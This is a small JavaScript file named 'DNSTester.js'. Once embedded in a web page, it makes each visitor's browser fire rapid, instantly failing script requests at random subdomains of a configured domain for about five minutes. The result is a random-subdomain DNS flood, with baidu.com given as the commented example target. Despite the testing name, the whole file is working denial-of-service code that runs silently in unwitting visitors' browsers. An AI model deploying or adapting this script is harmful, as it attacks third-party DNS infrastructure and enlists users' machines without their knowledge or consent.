/*!
 * DNSTester.js 0.0.1
 * https://github.com/cnbeining/DNSTester.js
 * http://www.cnbeining.com/
 *
 * Includes jQuery
 * http://jquery.com/
 * 
 * Copyright 2015 Beining
 * Released under the GNU GENERAL PUBLIC LICENSE Version 2
 * https://github.com/cnbeining/DNSTester.js/blob/master/LICENSE
 *
 */
document.write("<script src='http://libs.baidu.com/jquery/2.0.0/jquery.min.js'>\x3c/script>");
!window.jQuery && document.write("<script src='http://code.jquery.com/jquery-latest.js'>\x3c/script>");
startime = (new Date).getTime();
var count = 0;
function unixtime() {
    var a = new Date;
    return Date.UTC(a.getFullYear(), a.getMonth(), a.getDay(), a.getHours(), a.getMinutes(), a.getSeconds()) / 1E3
}
function makeid(length)
{
    var text = "";
    var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

    for( var i=0; i < length; i++ )
        text += possible.charAt(Math.floor(Math.random() * possible.length));
        text = "https://" + text + DOMAIN //In case you put me in HTTPS sites

    return text;
}
NUM = 1;
function r_send2() {
    get(makeid(Math.floor((Math.random() * 64) + 1))) // NEVER FORGET
}
function get(a) {
    var b;
    $.ajax({
        url: a,
        dataType: "script",
        timeout: 1E-4, //So fail immediately, but good enough to stress DNS
        cache: !0,
        beforeSend: function() {
        requestTime = (new Date).getTime()
        },
        complete: function() {
        responseTime = (new Date).getTime();
        b = Math.floor(responseTime - requestTime);
        3E5 > responseTime - startime && (r_send(b), count += 1)
        }
        })
}
function r_send(a) {
    setTimeout("r_send2()", a)
}
//var DOMAIN = ".baidu.com/" // Change me!
//setTimeout("r_send2()", 1E-2); // Change speed here!